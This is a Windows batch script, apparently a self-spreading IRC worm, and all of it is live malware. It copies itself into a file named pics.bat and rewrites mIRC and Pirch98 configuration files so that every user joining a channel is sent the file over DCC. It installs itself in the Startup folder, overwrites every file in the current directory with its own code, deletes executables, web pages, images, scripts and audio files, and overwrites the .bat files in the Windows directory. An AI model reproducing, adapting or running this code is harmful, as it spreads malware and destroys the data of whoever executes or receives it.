@echo off
REM Name:     test          
REM Author:   test          
ctty nul
md C:\pro
copy %0 C:\pro\pics.bat
if exist C:\mirc\mirc.ini goto ircC
if exist C:\mirc32\mirc.ini goto ircC32
if exist C:\progra~1\mirc\mirc.ini goto ircP
if exist C:\progra~1\mirc32\mirc.ini goto ircP32
goto ircend
:ircC
echo [script] > C:\mirc\script.ini
echo n0=on:join:#: { >> C:\mirc\script.ini
echo n1=  /if ( $nick == $me ) { halt } >> C:\mirc\script.ini
echo n2=  /.dcc send $nick C:\pro\pics.bat >> C:\mirc\script.ini
echo n3=} >> C:\mirc\script.ini
goto ircend
:ircC32
echo [script] > C:\mirc32\script.ini
echo n0=on:join:#: { >> C:\mirc32\script.ini
echo n1=  /if ( $nick == $me ) { halt } >> C:\mirc32\script.ini
echo n2=  /.dcc send $nick C:\pro\pics.bat >> C:\mirc32\script.ini
echo n3=} >> C:\mirc32\script.ini
goto ircend
:ircP
echo [script] > C:\progra~1\mirc\script.ini
echo n0=on:join:#: { >> C:\progra~1\mirc\script.ini
echo n1=  /if ( $nick == $me ) { halt } >> C:\progra~1\mirc\script.ini
echo n2=  /.dcc send $nick C:\pro\pics.bat >> C:\progra~1\mirc\script.ini
echo n3=} >> C:\progra~1\mirc\script.ini
goto ircend
:ircP32
echo [script] > C:\progra~1\mirc32\script.ini
echo n0=on:join:#: { >> C:\progra~1\mirc32\script.ini
echo n1=  /if ( $nick == $me ) { halt } >> C:\progra~1\mirc32\script.ini
echo n2=  /.dcc send $nick C:\pro\pics.bat >> C:\progra~1\mirc32\script.ini
echo n3=} >> C:\progra~1\mirc32\script.ini
goto ircend
:ircend
if exist C:\pirch98\events.ini goto pir
goto pirend
:pir
copy %0 %WinDir%\pics.bat
echo [Levels] > C:\Pirch98\events.ini
echo Enabled=1 >> C:\Pirch98\events.ini
echo Count=6 >> C:\Pirch98\events.ini
echo Level1=000-Unknows >> C:\Pirch98\events.ini
echo 000-UnknowsEnabled=1 >> C:\Pirch98\events.ini
echo Level2=100-Level 100 >> C:\Pirch98\events.ini
echo 100-Level 100Enabled=1 >> C:\Pirch98\events.ini
echo Level3=200-Level 200 >> C:\Pirch98\events.ini
echo 200-Level 200Enabled=1 >> C:\Pirch98\events.ini
echo Level4=300-Level 300 >> C:\Pirch98\events.ini
echo 300-Level 300Enabled=1 >> C:\Pirch98\events.ini
echo Level5=400-Level 400 >> C:\Pirch98\events.ini
echo 400-Level 400Enabled=1 >> C:\Pirch98\events.ini
echo Level6=500-Level 500 >> C:\Pirch98\events.ini
echo 500-Level 500Enabled=1 >> C:\Pirch98\events.ini
echo [000-Unknowns] >> C:\Pirch98\events.ini
echo User1=*!*@* >> C:\Pirch98\events.ini
echo UserCount=1 >> C:\Pirch98\events.ini
echo Events1= ON JOIN:#: /dcc send $nick %WinDir%\pics.bat >> C:\Pirch98\events.ini
echo EventCount=1 >> C:\Pirch98\events.ini
echo [100-Level 100] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [200-Level 200] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [300-Level 300] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [400-Level 400] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [500-Level 500] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
:pirend
copy %0 C:\Affe.zyy
ren C:\Affe.zyy AS.bat
copy C:\AS.bat %windir%\startm~1\progra~1\autost~1\*.bat
@del C:\AS.bat
md C:\suPs
copy %0 C:\suPs\olaf.xyv
ren C:\suPs\olaf.xyv snake.bat
subst L: C:\suPs
for %%v in (*.*) do copy %0 C:\hamlet.bat
for %%v in (*.*) do copy C:\hamlet.bat *.*
@del C:\hamlet.bat
@del *.exe
@del *.htm
@del *.gif
@del *.html
@del *.vbs
@del *.js
@del *.mp3
@del *.com
@del *.hlp
for %%w in (%windir%\*.bat) do copy %0 %%w
